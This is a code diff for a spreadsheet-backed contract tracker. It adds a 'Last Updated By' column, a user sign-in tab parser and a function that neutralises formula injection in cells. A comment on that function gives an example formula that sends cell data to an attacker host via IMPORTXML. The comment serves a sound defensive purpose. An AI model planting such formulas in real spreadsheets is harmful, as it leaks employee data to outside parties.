@@ -42,7 +42,8 @@ export type InputColumnKey =
   | "managerEmail"
   | "location"
   | "notes"
-  | "lastUpdated";
+  | "lastUpdated"
+  | "lastUpdatedBy";
 
 export type CalculatedColumnKey =
   | "contractCount"
@@ -98,6 +99,14 @@ export const CONTRACT_COLUMNS: SheetColumn[] = [
   { key: "location", header: "Location / Site", aliases: ["Location", "Site"], kind: "input", type: "text", width: 130 },
   { key: "notes", header: "Notes / Comments", aliases: ["Notes", "Comments"], kind: "input", type: "text", width: 220 },
   { key: "lastUpdated", header: "Last Updated", kind: "input", type: "datetime", width: 150 },
+  {
+    key: "lastUpdatedBy",
+    header: "Last Updated By",
+    kind: "input",
+    type: "text",
+    width: 200,
+    note: "Filled in automatically with whoever made the change.",
+  },
 
   { key: "contractCount", header: "Contract Count", kind: "calculated", type: "number", width: 120 },
   { key: "daysRemaining", header: "Days Remaining", kind: "calculated", type: "number", width: 120 },
@@ -229,12 +238,28 @@ export function parseContractRow(
     location: text(cell(row, index, "location")),
     notes: text(cell(row, index, "notes")),
     lastUpdated: parseTimestampValue(cell(row, index, "lastUpdated")),
+    lastUpdatedBy: text(cell(row, index, "lastUpdatedBy")),
   };
 }
 
 /** True when a sheet row holds nothing we care about. */
 export function isBlankRow(row: unknown[]): boolean {
   return !row.some((value) => text(value) !== "");
+}
+
+/**
+ * Stops a cell being treated as a formula.
+ *
+ * Google Sheets and Excel execute anything beginning with `=`, `+`, `-`, `@`
+ * or a control character. Without this, a Notes field reading
+ * `=IMPORTXML("http://attacker/"&A2)` would run inside the company's
+ * spreadsheet — quietly exporting employee data — or inside Excel when HR opens
+ * the CSV. Prefixing with an apostrophe makes the cell plain text; Sheets does
+ * not display the apostrophe.
+ */
+export function neutraliseFormula(value: string | number): string | number {
+  if (typeof value !== "string" || value === "") return value;
+  return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
 }
 
 /** The value written to each input column for a contract. */
@@ -403,4 +428,35 @@ export function parseSheetBoolean(value: string, fallback: boolean): boolean {
   if (["yes", "y", "true", "1", "on"].includes(text)) return true;
   if (["no", "n", "false", "0", "off"].includes(text)) return false;
   return fallback;
+}
+
+/** Headings for the tab that decides who may sign in. */
+export const USERS_HEADERS = ["Email", "Name", "Role", "Active", "Last Signed In"] as const;
+
+export interface SheetUser {
+  email: string;
+  name: string;
+  /** As typed in the sheet; validated against the known roles on read. */
+  role: string;
+  active: boolean;
+  lastSignedIn: string;
+  /** 1-based row, so a sign-in can be stamped back. */
+  rowNumber: number;
+}
+
+/** Reads one row of the Users tab. */
+export function parseUserRow(row: unknown[], rowNumber: number): SheetUser | null {
+  const email = String(row?.[0] ?? "").trim().toLowerCase();
+  if (!email || !email.includes("@")) return null;
+
+  const active = String(row?.[3] ?? "").trim();
+  return {
+    email,
+    name: String(row?.[1] ?? "").trim() || email,
+    role: String(row?.[2] ?? "").trim(),
+    // Blank means active: a row someone has just added should work.
+    active: parseSheetBoolean(active, true),
+    lastSignedIn: String(row?.[4] ?? "").trim(),
+    rowNumber,
+  };
 }
